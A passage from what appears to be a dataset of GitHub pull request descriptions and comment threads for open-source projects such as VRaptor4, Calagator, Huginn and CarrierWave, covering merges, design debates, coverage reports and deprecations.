wrote:\n\n> Oh that makes sense. Yes I will need help, who volunteers as tribute? :P\n>\n> Thanks!\n>\n>\n>\n> > On Jun 9, 2015, at 5:40 PM, Yossi Farjoun <notifications@github.com>\n> wrote:\n> >\n> > Can you follow the link?\n> > http://prodinfobuild.broadinstitute.org:8085/browse/PICARD-TRUNK-3823\n> > It shows that the breakage happens when some test tries inserting your\n> new\n> > metric files into the database.\n> >\n> > I think it\'s going to be a bit difficult to figure it out on your own. I\n> > recommend asking Matt Sooknah or Miguel since the problem is that the\n> > database is missing the ""ACCUMULATION_LEVEL"" field, which is now added\n> > since you are collecting using the multi-level collector.\n> >\n> > Does this make sense?\n> >\n> > Yossi.\n> >\n> > On Tue, Jun 9, 2015 at 4:51 PM, kbergin <notifications@github.com>\n> wrote:\n> >\n> > > Ok, who should I talk to about that- I saw your hip chat about picard\n> > > private breaking :( what broke and how do I fix it?\n> > >\n> > >\n> > >\n> > > > On Jun 9, 2015, at 4:13 PM, Yossi Farjoun <notifications@github.com>\n> > > wrote:\n> > > >\n> > > > Kylee, make sure that you are aware of the next ""picard release"" and\n> that\n> > > > you see that the gc metrics are produced as are all the other metrics\n> > > etc.\n> > > >\n> > > > On Tue, Jun 9, 2015 at 3:02 PM, kbergin <notifications@github.com>\n> > > wrote:\n> > > >\n> > > > > Merged #221 <https://github.com/broadinstitute/picard/pull/221>.\n> > > > >\n> > > > > \xe2\x80\x94\n> > > > > Reply to this email directly or view it on GitHub\n> > > > > <https://github.com/broadinstitute/picard/pull/221#event-326649526\n> >.\n> > >\n> > > > >\n> > > > \xe2\x80\x94\n> > > > Reply to this email directly or view it on GitHub.\n> > > >\n> > >\n> > > \xe2\x80\x94\n> > > Reply to this email directly or view it on GitHub\n> > > <\n> https://github.com/broadinstitute/picard/pull/221#issuecomment-110500760>\n>\n> > > .\n> > >\n> > \xe2\x80\x94\n> > Reply to this email directly or view it on GitHub.\n> >\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/broadinstitute/picard/pull/221#issuecomment-110524003>\n> .\n>\n']"
170,broadinstitute/picard,200.0,"DuplicateSetIterator.

Depends on: https://github.com/samtools/htsjdk/pull/225.

<!---
@huboard:{""order"":158.0,""milestone_order"":200,""custom_state"":""""}
-->
","['@yfarjoun do you want to champion the code review and inclusion into picard with the team over the next sprint?', 'sure. not sure what that requires from me though...\n\nOn Wed, Apr 29, 2015 at 10:28 AM, Nils Homer <notifications@github.com>\nwrote:\n\n> @yfarjoun <https://github.com/yfarjoun> do you want to champion the code\n> review and inclusion into picard with the team over the next sprint?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/broadinstitute/picard/pull/200#issuecomment-97448361>.\n>\n']"
171,brooklyncentral/clocker,94.0,"- Adds support for latest docker API
- Configure TLS on Docker 1.4.1
- Make SDN providers pluggable
- Initial support for IBM SDN VE networking","['@sjcorbett I have rebased and squashed the SDN plugin feature branch, can you have a look at it when you have time to review the changes, please? It needs the https://github.com/grkvlt/incubator-brooklyn/tree/tmp/jclouds-2.0.0 and https://github.com/brooklyncentral/advanced-networking/tree/tmp/jclouds-2.0.0 branches as dependencies, as well as the latest jclouds and jclouds-labs to build.', ""This looks very good. I've made no major comments. It would be good to see some tests for each SDN provider."", 'This is ready to merge, although it is using a private build of Brooklyn and jclouds. The new version of jclouds (1.9.0) will be available some time next week, and once Brooklyn is using that I will update, but until then this should be good enough for a pre-release of 0.8.0']"
172,caelum/vraptor4,265.0,#247 ,"[':gogogo: ?', ':+1: ', 'take off :airplane: ']"
173,caelum/vraptor4,485.0,"When migrating a large project from another MVC framework to VRaptor sometimes there is a need to maintain both frameworks configured in the same web.xml during the migration period. In some cases it would be preferable to configure VRaptor filter with /* mapping and then programmatically choose to trigger VRaptor stack or not. With VRaptor 3 this can be accomplished by extending VRaptor filter and calling chain.doFilter(...) instead of super.doFilter(...).

We are currently migrating a large project, in production, from Struts 1.3.7 to VRaptor 4 and we've customized Struts to let CDI create it's Actions and sometimes HttpServletRequest dependent dependencies are injected in those Actions.

As a migration strategy we opted to gradually change URLs from Struts Actions to VRaptor controllers, and route all mobile user agent to VRaptor first (to be able to accomplish a mobile first approach). VRaptor must be the first to answer the request but it's stack should only be triggered for mobile requests. If even so, the route doesn't match any VRaptor Controller the request should be propagated to Struts (will take some time to migrate all Actions and as soon as one Action is migrated to VRaptor that change goes to production).

This pull request intent is to facilitate programmatically avoiding VRaptor stack if necessary by specializing the RequestStartedFactory and firing any event that doesn't extends VRaptorRequestStarted and implements RequestStarted. This support makes it easier to make large projects migration such as this, and as so, can increase VRaptor adoption in such scenario.","[""Fine by me. Seems to be a good use case.\n\n\nOn Wed, Apr 2, 2014 at 6:45 AM, Erich <notifications@github.com> wrote:\n\n> When migrating a large project from another MVC framework to VRaptor in\n> some cases maintain both frameworks configured in the same web.xml is\n> needed during the migration period. In some cases It would be preferable to\n> configure VRaptor filter with /* mapping and then programatically choose to\n> trigger VRaptor stack or not. With VRaptor 3 this can be accomplished by\n> extending VRaptor filter and calling chain.doFilter(...) when needed.\n>\n> I am currently migrating a project from Struts 1.3.7 to VRaptor 4 and I've\n> customized Struts to let CDI create It's Actions and sometimes\n> HttpServletRequest dependant dependencies are injected in those Actions.\n>\n> As a migration strategy I opted to use VRaptor 4 only to respond to\n> requests with mobile user agent (to be able to accomplish a mobile first\n> approach). VRaptor then must be the first to answer the request but It\n> should trigger It's stack only for mobile requests. When a route doesn't\n> match any VRaptor Controller in a mobile request it should be propagated to\n> Struts (will take some time to migrate all Actions and as soon as one\n> Action is migrated to VRaptor that change goes to production).\n>\n> This pull request intent to facilitate programmatically avoid VRaptor\n> stack if necessary by specializing the RequestStartedFactory and firing any\n> event that differs VRaptorRequestStarted and implements RequestStarted.\n> ------------------------------\n> You can merge this Pull Request by running\n>\n>   git pull https://github.com/erichegt/vraptor4 master\n>\n> Or view, comment on, or merge it at:\n>\n>   https://github.com/caelum/vraptor4/pull/485\n> Commit Summary\n>\n>    - Extracts RequestStarted creation to a factory to support avoiding\n>    VRaptor stack if necessary\n>\n> File Changes\n>\n>    - *M* vraptor-core/src/main/java/br/com/caelum/vraptor/VRaptor.java<https://github.com/caelum/vraptor4/pull/485/files#diff-0>(27)\n>    - *M*\n>    vraptor-core/src/main/java/br/com/caelum/vraptor/events/RequestStarted.java<https://github.com/caelum/vraptor4/pull/485/files#diff-1>(49)\n>    - *A*\n>    vraptor-core/src/main/java/br/com/caelum/vraptor/events/VRaptorRequestStarted.java<https://github.com/caelum/vraptor4/pull/485/files#diff-2>(54)\n>    - *A*\n>    vraptor-core/src/main/java/br/com/caelum/vraptor/ioc/RequestStartedFactory.java<https://github.com/caelum/vraptor4/pull/485/files#diff-3>(24)\n>    - *M*\n>    vraptor-core/src/main/java/br/com/caelum/vraptor/observer/RequestHandlerObserver.java<https://github.com/caelum/vraptor4/pull/485/files#diff-4>(14)\n>    - *M*\n>    vraptor-core/src/test/java/br/com/caelum/vraptor/MockStaticContentHandler.java<https://github.com/caelum/vraptor4/pull/485/files#diff-5>(11)\n>    - *M* vraptor-core/src/test/java/br/com/caelum/vraptor/VRaptorTest.java<https://github.com/caelum/vraptor4/pull/485/files#diff-6>(3)\n>    - *A*\n>    vraptor-core/src/test/java/br/com/caelum/vraptor/ioc/AnotherFrameworkRequestStarted.java<https://github.com/caelum/vraptor4/pull/485/files#diff-7>(41)\n>    - *A*\n>    vraptor-core/src/test/java/br/com/caelum/vraptor/ioc/MockRequestHandlerObserver.java<https://github.com/caelum/vraptor4/pull/485/files#diff-8>(23)\n>    - *A*\n>    vraptor-core/src/test/java/br/com/caelum/vraptor/ioc/MockRequestStartedFactory.java<https://github.com/caelum/vraptor4/pull/485/files#diff-9>(26)\n>    - *A*\n>    vraptor-core/src/test/java/br/com/caelum/vraptor/ioc/RequestStartedFactoryTest.java<https://github.com/caelum/vraptor4/pull/485/files#diff-10>(63)\n>    - *M*\n>    vraptor-core/src/test/java/br/com/caelum/vraptor/observer/RequestHandlerObserverTest.java<https://github.com/caelum/vraptor4/pull/485/files#diff-11>(17)\n>\n> Patch Links:\n>\n>    - https://github.com/caelum/vraptor4/pull/485.patch\n>    - https://github.com/caelum/vraptor4/pull/485.diff\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/caelum/vraptor4/pull/485>\n> .\n>\n\n\n\n-- \nAlberto Souza\n\nwww.caelum.com.br\nwww.leanpub.com/playframeworknapratica\nwww.alots.wordpress.com/"", 'merged! tks a lot @erichegt ', 'There some issues in this code yet. Why was merged too soon, @Turini?\n\nWhere is the docs?\n\nAnotherFrameworkRequest can be renamed to better name?', "">  Why was merged too soon, @Turini?\r\n\r\nto test all changes on GUJ before the vraptor final version\r\n(I'm updating GUJ code right now)\r\n\r\nwe can rename the class test and commit on master. \r\nIt will not affect the behavior of fremework :) "", ""This is an extension point that is very specific. I don't think too many people are running VRaptor + another Web Framework.\r\n\r\nAnyway I thought `chain.doFilter` with the original request and response would do the trick, without the need of this PR.\r\n"", ""Do you have an example? I agree with you, is very specific, but is a big\ncase as well. At least for me, it is a good thing to say to a company that\nis thinking in change its framework. But if you have an idea to do the same\nthing without the developer needs to customize VRaptor's filter, it would\nbe even better :).\n\n\nOn Thu, Apr 3, 2014 at 11:37 AM, Lucas Cavalcanti\n<notifications@github.com>wrote:\n\n> This is an extension point that is very specific. I don't think too many\n> people are running VRaptor + another Web Framework.\n>\n> Anyway I thought chain.doFilter with the original request and response\n> would do the trick, without the need of this PR.\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/caelum/vraptor4/pull/485#issuecomment-39458565>\n> .\n>\n\n\n\n-- \nAlberto Souza\n\nwww.caelum.com.br\nwww.leanpub.com/playframeworknapratica\nwww.alots.wordpress.com/"", ""> it is a good thing to say to a company that is thinking in change its framework. \r\n\r\n+1 to @asouza's comment... to me it is a nice differential.\r\nif someone have a simple and elegant solution, we can revert this changes."", ""You can test a pull request without merging. You only need to fetch the pull, install with maven. It's too easy. It's really nice to get more feedback before merge too specific features. And it's more safe to test in a real application before merge.\r\n\r\nAbout technical issues regarding this pull request, I agree with Lucas. I think that few people have this scenario. And more: I have a project with both vraptor 4 and JSF, and two frameworks living together without any problems. So this case is too specific to merge into core framework. Plugin will be better."", ""Nowadays I have an application running JSF 1.2 and VRaptor together. For\r\nsolving the issue and avoid any kind of conflicts (normally with jsf upload\r\nfilters) I just mapped the vraptor filter to a specific url prefix.\r\n\r\nAnd if I'm not wrong, if VRaptor can't handle the URL it leaves the\r\ncontainer take of it, so the others frameworks can handle right after.\r\n\r\nIf the intention of this PR is simplify a transition from one framework to\r\nVRaptor, I think we have a good reason!\r\n\r\n\r\n\r\n\r\nOn Thu, Apr 3, 2014 at 1:31 PM, Ot\xc3\xa1vio Garcia <notifications@github.com>wrote:\r\n\r\n> You can test a pull request without merging. You only need to fetch the\r\n> pull, install with maven. It's too easy. It's really nice to get more\r\n> feedback before merge too specific features. And it's more safe to test in\r\n> a real application before merge.\r\n>\r\n> About technical issues regarding this pull request, I agree with Lucas. I\r\n> think that few people have this scenario. And more: I have a project with\r\n> both vraptor 4 and JSF, and two frameworks living together without any\r\n> problems. So this case is too specific to merge into core framework. Plugin\r\n> will be better.\r\n>\r\n> --\r\n> Reply to this email directly or view it on GitHub<https://github.com/caelum/vraptor4/pull/485#issuecomment-39473367>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nRafael Ponte\r\nhttp://cursos.triadworks.com.br"", ""@rponte In my case I've just override `StaticContentHandler` adding a rule to skip `*.jsf` pages, and works fine. Because of this simple solution I think that this pull request is not necessary. In the case of struts, vraptor and only skip `*do` pages."", 'The only impact of this PR is having a little overengineering: instead of a class ResourceStarted, an interface with a factory and an implementation.\r\n\r\nno problem merging it.', ""If, application is running with *.do mapping... And if they are using nice\r\nurls? How to avoid?\r\n\r\n\r\nOn Thu, Apr 3, 2014 at 2:22 PM, Ot\xc3\xa1vio Garcia <notifications@github.com>wrote:\r\n\r\n> @rponte <https://github.com/rponte> In my case I've just override\r\n> StaticContentHandler adding a rule to skip *.jsf pages, and works fine.\r\n> Because of this simple solution I think that this pull request is not\r\n> necessary. In the case of struts, vraptor and only skip *do pages.\r\n>\r\n> --\r\n> Reply to this email directly or view it on GitHub<https://github.com/caelum/vraptor4/pull/485#issuecomment-39479116>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nAlberto Souza\r\n\r\nwww.caelum.com.br\r\nwww.leanpub.com/playframeworknapratica\r\nwww.alots.wordpress.com/"", 'I think it is a lot of arguments to a simple change... It is working fine and does not affect users.', ""Comment too heavy, Turini. This is the right place to discuss about all\nchanges.\n\nIf we can't expose our opinion, may we can close the project source and\nforbid community efforts."", ""It's is not a heavy comment, nor censorship, it's just his opinion, @garcia-jj \r\n\r\nThere is a term for it: bikeshedding. http://en.wiktionary.org/wiki/bikeshedding\r\n\r\nOne of the main principles of VRaptor is extensibility. If someone tried to change some behaviour and couldn't, we should always try to do something about it.\r\n\r\nDo you still have any technical reason against this PR? Or it is just the early merge?\r\n"", ""Yes, I have and I already expose my experience about two frameworks in the\nsame app.\n\nRegarding performance issues I'm migrating an app from vraptor to jsf, and\nall works fine without this pull request."", ""Are you using and servlet mapping? like *.jsf or *.xhtml? If you are, your\r\nsolution is valid. I don't see how you can handle urls if them are in\r\npretty style. For example /products/search. How can you know which\r\nframework needs to handle?\r\n\r\n\r\nOn Thu, Apr 3, 2014 at 3:47 PM, Ot\xc3\xa1vio Garcia <notifications@github.com>wrote:\r\n\r\n> Yes, I have and I already expose my experience about two frameworks in the\r\n> same app.\r\n>\r\n> Regarding performance issues I'm migrating an app from vraptor to jsf, and\r\n> all works fine without this pull request.\r\n>\r\n> --\r\n> Reply to this email directly or view it on GitHub<https://github.com/caelum/vraptor4/pull/485#issuecomment-39489516>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nAlberto Souza\r\n\r\nwww.caelum.com.br\r\nwww.leanpub.com/playframeworknapratica\r\nwww.alots.wordpress.com/"", ""Did you understand that your use case is not the same as @erichegt's, right?\r\n\r\none thing is have jsf + vraptor, other is struts 1 + vraptor.\r\n\r\nPS: in which world JSF has better performance than vraptor?"", '@lucascs Both JSF and Struts process request with Servlet, so behaviour is the same. In my case I just add a rule to skip `*.jsf`. Because Struts have the same behaviour you can do the same to Struts `*.do`.', ""they don't use *.do,*.jsf and they won't! Third email about that :).\r\n\r\n\r\nOn Thu, Apr 3, 2014 at 4:21 PM, Ot\xc3\xa1vio Garcia <notifications@github.com>wrote:\r\n\r\n> @lucascs <https://github.com/lucascs> Both JSF and Struts process request\r\n> with Servlet, so behaviour is the same. In my case I just add a rule to\r\n> skip *.jsf. Because Struts have the same behaviour you can do the same to\r\n> Struts *.do.\r\n>\r\n> --\r\n> Reply to this email directly or view it on GitHub<https://github.com/caelum/vraptor4/pull/485#issuecomment-39493519>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nAlberto Souza\r\n\r\nwww.caelum.com.br\r\nwww.leanpub.com/playframeworknapratica\r\nwww.alots.wordpress.com/"", ""> PS: in which world JSF has better performance than vraptor?\r\n\r\nJSF 2.2 beans are now CDI beans (we don't need backing beans anymore). I did some tests with jmeter and the performance is very good. But if you have interest about this issue, we can talk outside this issue to avoid off-topic."", '@garcia-jj sorry for the late response.\r\n\r\nThe pull request intent just to facilitate. I was accomplishing my goal in RC1 and RC2 without any problem.\r\n\r\nSpecialing StaticContentHandler works fine if the second framework doesn\'t use CDI as well. In my case unfortunately HttpServletRequest was injected in some classes. If I\'m not mistaken setting the HttpServletRequest into the CDIRequestFactories and firing the VRaptor stack were coupled, leading to NPE\'s.\r\n\r\nAnyway Isn\'t fair to fire a StrutsStartedEvent instead of treating *.do as static content?\r\n\r\nCustomizing MutableRequest isn\'t common either, but imagine migrating a legacy code running in a single instance with lots of request.isSecured() spread in the code to a arquitecture with 2 instances behind a LoadBalancer that no longer need to use SSL between It and the instances. Would not be nice to change the behavior of the method isSecured to request.getHeader(""X-Forwarded-Proto"")? Maybe not but is always good to have the option =)']"
174,caelum/vraptor4,717.0,Closes #657. Related: #713 and #657,"['@lucascs @garcia-jj @Turini \r\n\r\nI did this initial commit to growing up the feature with your help.', 'Now about here:\r\nhttps://github.com/caelum/vraptor4/blob/master/vraptor-core/src/main/java/br/com/caelum/vraptor/serialization/gson/GsonDeserialization.java#L88\r\n\r\nyou could do something like:\r\n- new Deserializee\r\n- setWithoutRoot with the result of this method: https://github.com/caelum/vraptor4/blob/master/vraptor-core/src/main/java/br/com/caelum/vraptor/serialization/gson/GsonDeserialization.java#L153-L158\r\n- get the Consumes annotation from controllerMethod\r\n- pass Deserializee to all options\r\n- use Deserializee here: https://github.com/caelum/vraptor4/blob/master/vraptor-core/src/main/java/br/com/caelum/vraptor/serialization/gson/GsonDeserialization.java#L104', '@lucascs \r\nSorry for the ignorant question, but how can I pass Deserializee to all options ?', 'Invoking the method by reflection ? :-)', ""I'm using reflection for now."", 'What do you think about the initial code ? @Turini @lucascs @garcia-jj \r\n\r\nThanks for the support @lucascs. :+1: ', 'Done.\r\n\r\nWhat do you think ? @lucascs @Turini @rponte @garcia-jj ', 'Done.\r\n\r\nWhat do you think ?', '@lucascs @Turini @garcia-jj \r\n\r\nI did make a test with a POC and worked fine. :smiley: ', ""nice, thks @renanigt. It'll be merged just after next release."", 'Ok @Turini.\r\n\r\nThanks to all for the support. :+1: @lucascs @Turini @garcia-jj ', 'I commited the docs, so you can do a review.', ""@renanigt, please, aways wait the conclusion of a discussion before implement the \r\nsuggestion. If not, you'll always need to revert commits according to the new opinion. "", ""Sorry @Turini.\r\n\r\nI did this commit just for that you can do a review on text docs, since @garcia-jj's suggested write it. Probably has some improvements and I'll need write again.\r\n\r\nI have done with a good intention. :-)\r\n\r\nSorry again."", 'We know you have the best intention :) No worry about that.\r\nBut always wait the conclusion before implement :+1: ', 'Ok @Turini.\r\n\r\nThanks a lot. :-)', 'Closes #657 ', 'The branch of this PR is behind master, I need update it ?\r\n\r\nBecause after my changes, things were commited on master.', 'nope... just wait this PR be merged (will be after next release)', 'Nope. Only if github detected a conflict.', 'Ok @Turini and @garcia-jj.\r\n\r\nSo, I think I can go wrinting something to vraptor-site docs.\r\nWhat do you think ? ', ""yes, please add some exemples on VRaptor's site docs (here, in the same PR)"", ""Since for now we can just change the `withoutRoot` property, what about write only about the `WithoutRoot` and `WithRoot` and don't explain about the extension ?"", ""Done with VRaptor's site docs.\r\n\r\nWhat do you think ? @garcia-jj @Turini @lucascs "", 'it will be released at RC2 version (this week, probably tomorrow)', 'Nice. Thanks. :-)']"
175,caelum/vraptor4,859.0,"This PR add JSON versioning capability to VRaptor4.
One of the most strategies used for API versioning is through URI. 
With this PR, one can do API versioning allowing the controller to build a result based on URI parameter. 

A sample example of usage follows:
```java
@Get(""/example/{version}"")
public void example(String version) {
	Object response = new Object();
	result.use(Results.json()).version(version).from(response).serialize();
}
```

@adolfoweloy @andrelrs ","[""Sounds great, but we don't need to create an ExclusionStrategy because gson already did this job internally."", ""I like this change, really nice PR @adolfoweloy.\r\nSince it breaks compatibility, I'm adding 4.2 milestone"", ""Can you add some docs about it on VRaptor's site? \r\nPlease, do it at this same PR, after code reviews :)"", 'I agree with @Turini. This is a great feature. I love it. Thank you.', '@Turini we have some pull requests targeted to 4.2. What you think to merge this pull requests in this weekend, to target our forces into 4.2 release? I think in this because I have another 2 pull requests with some internal refactor that depends from 848. If a critical bug will find, we can use the tags to fix then in the 4.1 tree.\r\n\r\nWhat you think?', ""sure, we can do it this friday. ok? \r\nI'll try to work on issues tagged as bugs this week to release 4.1.2 before it"", 'Great @Turini ', 'How do you feel about adding a more generic future-proof approach?\r\n```java\r\ninterface JSONSerialization {\r\n   //...\r\n   JSONSerialization config(Function<GsonSerializerBuilder,GsonSerializerBuilder> configurer);\r\n}\r\n```\r\nSo we can use on java8\r\n```java\r\nresult.use(json()).config((b) -> b.version(1.0).indented().recursive()).from(resource).serialize();\r\n```\r\n\r\nAnd we can provide some function implementations for just version, or just indented, etc...\r\n\r\n\r\n\r\n', 'Sounds great @lucascs ', '@lucascs  Do you think in this feature using Java 8 plugin, or in the vraptor-core using Guava?\r\n\r\nThe idea is too pretty. In the past we already discuss about using a generic way to configure serializers, so you idea resolves this gap. I like it.', '@adolfoweloy Thank you for your pull request. I like it, and I think is ready to merge. :rocket: \r\n', ""Great @garcia-jj \r\nAs suggested @Turini , I think it will be good to add some docs about it on VRaptor's site.\r\nDo you think it's better to add another PR?"", ""please, on this same PR (We'll merge here just before `4.2.0 Final`)"", '@garcia-jj I mean for vraptor-core using Guava, which is more attractive in java 8, but is usable in java 7 if we provide a class with function builders....\r\n\r\nWhat about adding `config` in this pull request instead of the `version` method in JSONSerialization?\r\n\r\nSince we are touching the interface, we can make a change that is extensible instead of one small feature.\r\n\r\nWhat do you think?', '@lucascs I think the name ```version``` is clearer because this is the real purpose for someone who wants to add service versioning using VRaptor4. \r\n', '@adolfoweloy My point is to add the `version` method on GsonSerializationBuilder and have a `config` method on JSONSerialization that receives that function.', 'I\'m starting documenting at this PR and I\'d like to know what do you think to write it at ""Consuming in other formats"" subtopic under ""Controllers"" main topic.\r\n', ""@lucascs ,\r\nUsing Guava at Java7 the client code will need to create it's own ```Function``` instance? As if it's true, client code would have to know about ```GsonJsonBuilder``` and I think we'd expose serialization internals. \r\n\r\nWhat do you think?\r\n\r\n```java\r\nFunction<GsonSerializerBuilder, GsonSerializerBuilder> configurer = \r\n    new Function<GsonSerializerBuilder, GsonSerializerBuilder>() {\r\n\t@Override\r\n\tpublic GsonSerializerBuilder apply(GsonSerializerBuilder builder) {\r\n\t\treturn builder;\r\n\t}\t\t\t\r\n};\r\nserialization.config(configurer).from(client).recursive().serialize();\r\n```"", 'Yes, makes sense... go with version for now.', ""@Turini , I've committed some docs about this feature at this same request."", ""Thank you one more time, @adolfoweloy. It's a nice feature. We'll merge \r\nit soon, just finishing some fixes to release a minor version before it. Thk"", 'Thanks again @adolfoweloy ']"
176,calagator/calagator,262.0,"Been wanting to do this for while. The `SourceParser` subclasses were creating an `AbstractEvent` and an `AbstractVenue`, but then immediately invoking complex methods to convert them to a normal `Event` and `Venue`. The abstract versions were transient, and never used outside of this process, and thus unnecessary. This refactoring removes all that complexity, and now `SourceParser` subclasses create `Event`s and `Venue`s directly.

This exposes more low-hanging refactoring fruit among the `SourceParser` subclasses, but I'll save that for later.","['Looks like Rubygems is having issues with its CDN. Hmm.', ""And we're back! Rubygems is responding again, so we're green."", ""What do y'all think? Good to merge? Want to do some more refactoring of the source parsers, but not until this is merged."", '@reidab @jc00ke Not sure if you guys are getting comment notifications or not. Sorry to pester if you already are!', ""I am, just haven't had time to review. Will try to review tonight."", ""Okay cool no rush. Just wanted to make sure it wasn't slipping through the\ncracks. Thanks!\n\nOn Thu, Dec 11, 2014, 8:23 PM Jesse Cooke <notifications@github.com> wrote:\n\n> I am, just haven't had time to review. Will try to review tonight.\n>\n> --\n> Reply to this email directly or view it on GitHub\n> <https://github.com/calagator/calagator/pull/262#issuecomment-66730841>.\n>"", ':thumbsdown: :thumbsup: ?', '![thumbs down](http://i.giphy.com/iJxHzcuNcCJXi.gif)', 'Kidding! I just wanted to use that gif.\r\n\r\nLemme look at this again.', ""Eh, well, since we can't drop 1.9 yet, we either have to add `backports` or `webmock`. I'd vote for the latter, as part of this PR, which would be a good introduction to this project. Does that sound alright?"", ""How much longer are you thinking of keeping 1.9 support around? https://www.ruby-lang.org/en/news/2014/01/10/ruby-1-9-3-will-end-on-2015/ It's not got much longer to live."", ""I'm down with dropping 1.9 support right now :wink: but @reidab was concerned there are installations out there that still run on it.\r\n\r\nMy vote is to drop it like it's :fire: "", ""Haha, that scene was exactly what I had in mind.\r\n\r\nI think the way to go is to add `backports` to get access to `Enumerable#lazy`, and then we can remove that dependency whenever it so happens that we drop 1.9. I'll also convert the spec over to use `webmock` while I'm at it."", '![thumbs up](http://replygif.net/i/1118.gif)', ""I'm totally stealing those gifs. :) Just pushed a new commit using `Enumerable#lazy`.\r\n\r\nSurprisingly, we cannot currently use `webmock` to test the laziness of that code block, because `SourceParser::Base.content_for` is already firing off the http request that we want to avoid at the very beginning of the whole process :( More refactoring will need to be done before I can safely remove it. Once this is merged, I'll begin work on a new PR to do that, while also moving the mocking and stubbing to the network level."", 'Good work, @botandrose!', 'Thanks!', ""My main concern was actually about dropping 2.0.0 support, since the production Calagator server is still using a version in that series. I'll be working on upgrading it over the next couple of weeks.""]"
177,cantino/huginn,518.0,,"['\n[![Coverage Status](https://coveralls.io/builds/1229150/badge)](https://coveralls.io/builds/1229150)\n\nCoverage increased (+0.15%) when pulling **951648c94ea109402996eaa5246e4c5a3ac3844c on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1229155/badge)](https://coveralls.io/builds/1229155)\n\nCoverage decreased (-0.08%) when pulling **951648c94ea109402996eaa5246e4c5a3ac3844c on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1229176/badge)](https://coveralls.io/builds/1229176)\n\nCoverage increased (+0.15%) when pulling **263d771d2410a50eff56e282ff9757305f7fa6da on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', ""This will significantly reduce the size of UserLocationAgent's details page."", '\n[![Coverage Status](https://coveralls.io/builds/1229240/badge)](https://coveralls.io/builds/1229240)\n\nCoverage increased (+0.15%) when pulling **223f3a61e93b16d710ce77fe83169bc44b51cb81 on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', 'Nice :)', '\n[![Coverage Status](https://coveralls.io/builds/1229732/badge)](https://coveralls.io/builds/1229732)\n\nCoverage increased (+0.15%) when pulling **d22cad0327803a61851b595cab9e84675abf3914 on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1229763/badge)](https://coveralls.io/builds/1229763)\n\nCoverage increased (+0.15%) when pulling **1784eeb38a5409dfd051afd743bdbc540eda893c on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1230622/badge)](https://coveralls.io/builds/1230622)\n\nCoverage decreased (-0.01%) when pulling **b25142e7931c102b74f0aa5ae8e8974f1c91af8f on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1230756/badge)](https://coveralls.io/builds/1230756)\n\nCoverage decreased (-0.06%) when pulling **edcd80f2288c8077843e3c2b089e007ef01e225c on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1230761/badge)](https://coveralls.io/builds/1230761)\n\nCoverage decreased (-0.06%) when pulling **edcd80f2288c8077843e3c2b089e007ef01e225c on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1230822/badge)](https://coveralls.io/builds/1230822)\n\nCoverage increased (+0.05%) when pulling **1406f37d48e4d02be082a4fb62c2b02180ca1ca9 on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', ""This is becoming beyond refactoring, so I'll wrap this up here. \xf0\x9f\x98\x81"", '\n[![Coverage Status](https://coveralls.io/builds/1230988/badge)](https://coveralls.io/builds/1230988)\n\nCoverage decreased (-0.15%) when pulling **dd507e3cbfd396b3a17eb36e03e970ea18d03f84 on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', 'Nice', '\n[![Coverage Status](https://coveralls.io/builds/1236441/badge)](https://coveralls.io/builds/1236441)\n\nCoverage increased (+0.09%) when pulling **10adab94dbfd781dc883c2469f09eabeeb849282 on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1237225/badge)](https://coveralls.io/builds/1237225)\n\nCoverage decreased (-0.06%) when pulling **be4dc34f8ef1d462b1a633bd0f934ebf220bda9a on knu:refactor-map_marker** into **94cec5e4cd8a8bb09738b81073828e67749bb6d7 on cantino:master**.\n']"
178,carrierwaveuploader/carrierwave,1245.0,Rework Pull Request https://github.com/carrierwaveuploader/carrierwave/pull/1216 into a single commit.,"['I like this solution.', 'What about deprecating the old behavior? At this point anyone using the existing module will get a `LoadError` when mixing it in to their uploader.', ""We can re-add the MimeTypes module and puts a Deprecation warning but it seems useless\xe2\x80\xa6\r\nI prefer, in this case, an upgrading notes in the README, but it's my opinion.\r\nWould you like me to choose the deprecation warning solution ?"", ""Yes, we definitely need to deprecate for one 0.x release. We're not yet held to sem-ver in pre-1.0, but I don't want to needlessly break stuff. This should be in addition to upgrade notes in the readme/wiki."", ""I'm with @bensie for the deprecation warning."", 'I rewrote my commit to keep MimeTypes module and puts a deprecation warning if someone use it.\r\ndemocracy won :triumph:', ""I've set the Mime::Types deprecation to 1.0, but feel free to update the version."", '@bensie thanks for the review :kissing_heart:', 'Thanks for cranking out the changes so quick!', 'Good to go -- thanks!', ':triumph: ', 'So nice. :gem: ', 'Uh oh -- we might not be there just yet...\r\nhttps://travis-ci.org/carrierwaveuploader/carrierwave/jobs/12590492', 